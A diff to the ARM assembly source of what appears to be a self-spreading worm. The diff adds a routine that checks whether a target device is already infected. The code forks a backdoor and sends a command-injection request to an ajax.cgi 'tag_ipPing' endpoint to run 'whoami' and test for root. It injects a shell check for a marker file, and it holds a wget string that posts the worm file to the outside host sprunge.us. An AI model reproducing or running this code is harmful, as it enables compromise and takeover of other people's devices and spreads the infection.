@@ -9,7 +9,6 @@
 .code 32
 
 @ encrypt everything in layers
-@ add check for already infected to prevent catastophe
 
 spawn_backdoor:
     ldr r7, =2                  @ fork the backdoor process
@@ -121,7 +120,6 @@ main_loop:
     cmp r0, #-1
     beq main_loop               @ try again on failure
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-send_payload:
     ldr r1, =check_payload      @ load the vulnerability test payload
     ldr r2, =126                @ its 126 bytes in length
     bl s_write                  @ send it out
@@ -129,7 +127,7 @@ send_payload:
     beq cleanup                 @ on socket failure, go to cleanup
 
     bl read_u2response          @ swallow http header
-check:
+
     bl s_read                   @ s_read in nl
     ldr r2, =4                  @ s_read in 4 bytes, we are checking for the sring root
     bl s_read
@@ -140,6 +138,43 @@ check:
     ldr r10, [r1, #0]           @ swap whats in the buffer with whats in r10
     cmp r8, r10                 @ are we root?
     bne cleanup                 @ if not, start over
+    bl close                    @ close the socket
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+    ldr r10, =sockaddr          @ load remote socket struct again
+    bl connect                  @ connect back
+    cmp r0, #-1
+    beq cleanup                 @ restart on failure
+    
+    ldr r1, =check_payload      @ load the infection test payload
+    ldr r2, =71                 @ its 71 bytes in length
+    bl s_write                  @ send it out
+    cmp r0, #-1
+    beq cleanup                 @ on socket failure, go to cleanup
+
+    ldr r1, =check_infected     @ load the infection test payload
+    ldr r2, =77                 @ its 77 bytes in length
+    bl s_write                  @ send it out
+    cmp r0, #-1
+    beq cleanup                 @ on socket failure, go to cleanup
+
+    ldr r1, =check_payload+77   @ load the closing out parts from out check payload
+    ldr r2, =49                 @ 49 bytes of http closing statement
+    bl s_write                  @ send this bitch out
+    cmp r0, #-1
+    beq cleanup                 @ on socket fail, start over
+
+    bl read_u2response          @ swallow http header
+
+    bl s_read                   @ s_read in nl
+    ldr r2, =4                  @ s_read in 4 bytes, we are checking for the sring woot
+    bl s_read
+    cmp r0, #-1
+    beq cleanup                 @ on socket fail, cleanup
+
+    ldr r8, =0x746f6f77         @ r8 = 'woot'
+    ldr r10, [r1, #0]           @ swap whats in the buffer with whats in r10
+    cmp r8, r10                 @ does that shit exist?
+    beq cleanup                 @ if so, start over
     bl close                    @ close the socket
 @!!!!!!!!MAGIC!!!!!!!!!!!
 magic:
@@ -327,6 +362,9 @@ backdooraddr:
 
 check_payload: @ 71 | 77 -> 49
 .asciz "GET /ajax.cgi?action=tag_ipPing&pip=127.0.0.1+%3E%2Fdev%2Fnull%20%26%26whoami HTTP/1.0\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n"
+
+check_infected:
+.asciz "if%20%5B%20-e%208%3D%3DD%20%5D%3Bthen%20echo%20woot%3Belse%20echo%20booo%3Bfi"
 
 store_wormness: @ 100 inject this on local box
 .asciz "wget%20-q%20-O%20-%20--post-data%3D%22sprunge%3D%24(cat%20.%2F8%3D%3DD)%22%20http%3A%2F%2Fsprunge.us"
